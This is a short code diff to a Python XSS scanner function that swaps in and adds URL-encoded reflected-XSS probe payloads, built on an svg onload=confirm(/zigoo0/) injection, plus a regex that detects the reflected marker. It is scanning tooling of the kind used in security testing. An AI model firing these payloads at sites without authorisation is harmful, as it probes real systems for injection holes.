@@ -55,6 +55,7 @@ def xss_func(url):
         print ga.bold+"\n [!] Now Scanning for XSS "+ga.end
         print ga.blue+" [!] Please wait ...."+ga.end
         #Paylod zigoo="css();" added for XSS in <a href TAG's
-        payloads = ['x%22%3E%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Ex', '%78%22%78%3e%78']
+        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
+        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
         check = re.compile('zigoo0<svg|x>x', re.I)
         main_function(url, payloads, check)
